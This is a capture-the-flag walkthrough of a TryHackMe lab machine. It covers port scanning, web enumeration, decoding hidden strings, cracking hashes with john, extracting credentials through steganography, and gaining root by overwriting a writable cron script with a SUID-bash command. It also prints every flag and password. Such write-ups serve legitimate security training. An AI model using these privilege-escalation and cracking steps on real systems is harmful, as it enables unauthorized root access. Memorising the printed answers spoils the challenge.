| Category          | Details                                                    |
|-------------------|------------------------------------------------------------|
| 📝 **Name**       | [Easy Peasy](https://tryhackme.com/room/easypeasyctf)      |  
| 🏷 **Type**       | THM Challenge                                              |
| 🖥 **OS**         | Linux                                                      |
| 🎯 **Difficulty** | Easy                                                       |
| 📁 **Tags**       | web enumeration, john, gost hash, stegseek, rot13, crontab |

# Scan
```
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
|_http-title: Apache2 Debian Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
```

# Solution

## Task 1: Enumeration through Nmap

### How many ports are open?
`nmap` scan shows `3`

### What is the version of nginx?
`nmap` scan show `1.16.1`

### What is running on the highest port?
`nmap` shows `Apache`

## Task 2: Compromising the machine

### Using GoBuster, find flag 1.

#### Enumerate web application running at port 80
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ feroxbuster --url http://$TARGET -w /usr/share/wordlists/dirb/big.txt          
200      GET       25l       69w      612c http://10.80.190.171/
301      GET        7l       11w      169c http://10.80.190.171/hidden => http://10.80.190.171/hidden/
200      GET        3l        5w       43c http://10.80.190.171/robots.txt
301      GET        7l       11w      169c http://10.80.190.171/hidden/whatever => http://10.80.190.171/hidden/whatever/
```

#### Discover hidden `<p>` tag containing base64 encoded content
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ curl http://$TARGET/hidden/whatever/
<!DOCTYPE html>
<html>
<head>
<title>dead end</title>
<style>
    body {
        background-image: url("https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg");
        background-repeat: no-repeat;
        background-size: cover;
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<center>
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
</center>
</body>
</html>
```

#### Decode base64 encoded content
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ echo ZmxhZ3tmMXJzN19mbDRnfQ== | base64 -d
flag{f1rs7_fl4g}
```

### Further enumerate the machine, what is flag 2?

#### Discover hash in `/robots.txt`
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ curl -s http://$TARGET:65524/robots.txt                                                                                         
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

#### Use rainbow table to crack discovered MD5 hash
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ curl -s https://md5.gromweb.com/?md5=a18672860d0510e5ab6699730763b250 -H "User-agent: $RANDOM" | grep -oP 'flag{.*}' | head -n 1
flag{1m_s3c0nd_fl4g}
```

### Crack the hash with easypeasy.txt, What is the flag 3?

#### Lookup flags in `index.html` of application running at 65524 port
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ curl -s http://$TARGET:65524 | grep -oP 'flag{.*}'
flag{9fdafbd64c47471a8f54cd3fc64cd312}
```
3rd flag does not require any cracking, it sits in plaintext in `index.html`

### What is the hidden directory?

#### Lookup hidden elements in web application running at 65524 port
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ curl -s http://$TARGET:65524 | grep hidden         
        <p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

#### Decode content of hidden element with base62
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ python3 - << 'EOF'
import string

alphabet = string.digits + string.ascii_uppercase + string.ascii_lowercase
base = len(alphabet)

s = "ObsJmP173N2X6dOrAgEAL0Vu"

num = 0
for c in s:
    num = num * base + alphabet.index(c)

print(num.to_bytes((num.bit_length() + 7) // 8, 'big').decode())
EOF
/n0th1ng3ls3m4tt3r
```

### Using the wordlist that provided to you in this task crack the hash what is the password?

#### Discover hash in content of webpage under decoded URL
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ curl -s http://$TARGET:65524/n0th1ng3ls3m4tt3r/
<html>
<head>
<title>random title</title>
<style>
        body {
        background-image: url("https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg");
        background-color:black;


        }
</style>
</head>
<body>
<center>
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
</html>
```

#### Crack hash using dictionary provided in the challenge
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ echo 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 > hash && john --format=gost hash --wordlist=easypeasy_1596838725703.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypasswordforthatjob (?)     
1g 0:00:00:00 DONE (2025-12-13 14:13) 7.142g/s 29257p/s 29257c/s 29257C/s vgazoom4x..flash88
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### What is the password to login to the machine via SSH?

#### Discover text file hidden in `binarycodepixabay.jpg`
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ wget -q http://$TARGET:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg && stegseek binarycodepixabay.jpg easypeasy_1596838725703.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "mypasswordforthatjob"
[i] Original filename: "secrettext.txt".
[i] Extracting to "binarycodepixabay.jpg.out".
```

#### Discover that revealed file contains encoded credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ cat binarycodepixabay.jpg.out 
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

#### Decode password
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ python3 - <<'EOF'
binary_string = (
    "01101001 01100011 01101111 01101110 01110110 01100101 01110010 "
    "01110100 01100101 01100100 01101101 01111001 01110000 01100001 "
    "01110011 01110011 01110111 01101111 01110010 01100100 01110100 "
    "01101111 01100010 01101001 01101110 01100001 01110010 01111001"
)

ascii_text = ''.join(chr(int(b, 2)) for b in binary_string.split())
print(ascii_text)
EOF
iconvertedmypasswordtobinary
```

### What is the user flag?

#### Access target over SSH using discovered credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Easy Peasy]
└─$ ssh boring@$TARGET -p 6498
<SNIP>
boring@kral4-PC:~$ id
uid=1000(boring) gid=1000(boring) groups=1000(boring)
```

#### Capture the user flag
```
boring@kral4-PC:~$ cat /home/boring/user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```

#### Rotate flag using rot13
```
boring@kral4-PC:~$ cat /home/boring/user.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
Hfre Synt Ohg Vg Frrzf Jebat Yvxr Vg`f Ebgngrq Be Fbzrguvat
flag{n0wits33msn0rm4l}
```

### What is the root flag?

#### Discover `/var/www/.mysecretcronjob.sh` being run every minute as `root`
```
boring@kral4-PC:~$ cat /etc/crontab 
<SNIP>
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

#### Check `/var/www/.mysecretcronjob.sh` permissions
```
boring@kral4-PC:~$ ls -l /var/www/.mysecretcronjob.sh && lsattr /var/www/.mysecretcronjob.sh
-rwxr-xr-x 1 boring boring 33 Jun 14  2020 /var/www/.mysecretcronjob.sh
--------------e--- /var/www/.mysecretcronjob.sh
```

#### Overwrite `/var/www/.mysecretcronjob.sh` with root shell creation command
```
boring@kral4-PC:~$ echo '/bin/cp /bin/bash /tmp/root_shell && chmod +s /tmp/root_shell' > /var/www/.mysecretcronjob.sh
```

#### Wait for `/tmp/root_shell` to be created and run it
```
boring@kral4-PC:~$ /tmp/root_shell -p
root_shell-4.4# id
uid=1000(boring) gid=1000(boring) euid=0(root) egid=0(root) groups=0(root),1000(boring)
```

#### Capture the root flag
```
root_shell-4.4# cat /root/.root.txt 
flag{63a9f0ea7bb98050796b649e85481845}
```
